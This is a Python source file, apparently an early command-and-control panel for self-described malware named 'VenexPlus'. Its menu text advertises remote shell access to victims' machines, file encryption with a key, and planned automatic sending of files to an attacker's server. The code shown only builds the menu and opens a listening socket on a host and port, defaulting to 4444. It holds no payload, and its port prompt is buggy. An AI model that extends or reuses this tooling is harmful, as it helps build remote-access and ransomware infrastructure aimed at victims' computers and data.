import socket
import os
from colorama import Fore,Style, init
import time
import sys


init(autoreset=True)


#isport is using
def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('127.0.0.1', int(port)))
        except socket.error:
            return True
        return False

#home
def home():
    os.system("cls")
    print("welcome to venexPlus")
    print("")
    print("[1] About VenexPlus Malwere ",end="");print(" [2] About VenexPlus C Panel ",end="");print(" [3] Start C Panel")
    print("")
    #choos choice
    while True:
        user_choise = input("Enter Choise : ")

        if user_choise not in ["1","2","3"]:
            print("\033[A\033[K", end='', flush=True)
            print(Fore.RED + "Enter valid number")
            time.sleep(2)
            print("\033[A\033[K", end='', flush=True)
        else:
            print("\033[A\033[K", end='', flush=True)
            break

    if user_choise == "1": 
        about()
    elif user_choise == "3":
        cpanel()


#about
def about():
    os.system("cls")
    print(Fore.BLUE + "\t\tVenexPlus")
    print("")
    print(Fore.GREEN + "[!=!] what is VenexPlus")
    print("\tVenexPlus is a Venex v2.0 this is upgraded version of Venex.\n \tVenexPlus is a malwere.\n \tAttacker can remotely accsess victim machin and openClose softwere.\n \tAtacker can encrypt file using Vencrypt algorithem with key.\n \tThis malwere have a ability to Auto work it is called on autoMode")
    print("")
    print(Fore.GREEN + "[!=!] Malwere Abilties")
    print(Fore.LIGHTWHITE_EX + "\t-Remote Shell")
    print("\t  Normal powershell command")
    print(Fore.LIGHTWHITE_EX + "\t-Under dark mode")
    print("\t  venex command")
    print(Fore.LIGHTWHITE_EX + "\t-AutoMod - to do")
    print("\t  desable remote shell and under dark mode when malwere is automod unwanted c panel")
    print("\t  auto encrypt file")
    print("\t  sending important file to Atacker server")
    print("")

    print("[0] Back to Home")
    about_choise  = input("Enter choise: ")
    if about_choise == "0":
         home()


#cpanel
def cpanel():
    os.system("cls")
    print("welcome to venexPlus")
    print("")
    print("")

    #validating Ip and stor ip
    while True:
        try:
            ip = input("Enter Host IP : ")
            socket.gethostbyaddr(ip)
            break
        except:
            print("\033[A\033[K", end='', flush=True)
            print(Fore.RED + "Enter valid IP")
            time.sleep(2)
            print("\033[A\033[K", end='', flush=True)
    
    #validating port and stor port
    while True:

        port = int(input("Enter Host Port (press Enter to 4444): "))

        if not port:
            port = 4444

        if is_port_in_use(port):
            print("\033[A\033[K", end='', flush=True)
            print(Fore.RED + f"Port {port} is in use by aunother programm")
            time.sleep(2)
            print("\033[A\033[K", end='', flush=True)
        else:
            break
            
    #creating ip v4 tcp socket        
    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    #binding socket 
    serverSocket.bind((ip,port))

    # beacome a sever socket
    serverSocket.listen(5)
    



home()



        
             




